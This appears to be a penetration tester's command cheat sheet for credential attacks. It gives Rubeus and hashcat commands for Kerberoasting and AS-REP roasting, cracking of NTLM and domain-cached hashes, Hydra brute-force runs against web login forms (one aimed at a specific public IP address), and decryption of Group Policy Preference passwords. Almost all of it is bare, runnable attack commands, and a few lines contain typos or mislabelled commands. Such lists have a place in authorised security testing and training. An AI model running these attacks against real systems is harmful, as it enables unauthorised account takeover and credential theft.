
hashcat64.exe --help | find "NTLM"
### Kerberoasting 
```
PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

Rubeus kerberoast /outfile:hashes.asreproast


hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

### ASREPRoasting
 
```
Rubeus kerberoast format:hashcat /outfile:hashes.asreproast



hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable


```
### NTLM
```
Wordlist          | hashcat -a 0 -m 400 example400.hash example.dict
Brute-Force       | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a

hashcat64.exe -a 0 -m 1000 C:\Users\NyaMeeEain\Desktop\ntlm.txt rockyou.txt
```
# Domain Cache credential (DCC2)
```
echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 hashes.txt
hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85f3b8' /usr/share/wordlists/rockyou.txt --force --potfile-disabl
```
# Avance Cracking Web Forms with Hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -V -s 80 192.168.1.2 http-get /wp-admin/
hydra -l root -P /usr/share/wordlists/rockyou.txt -f -V -s 7001 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"
hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
hydra -l IRISnoir -P /usr/share/wordlists/rockyou.txt -e nsr -v -V http-post-form://testasp.vulnweb.com/"Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"

```

# GPP
```
cat Groups.xml | grep -o 'cpassword="[^"]\+"\|userName="[^"]\+"'

gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```
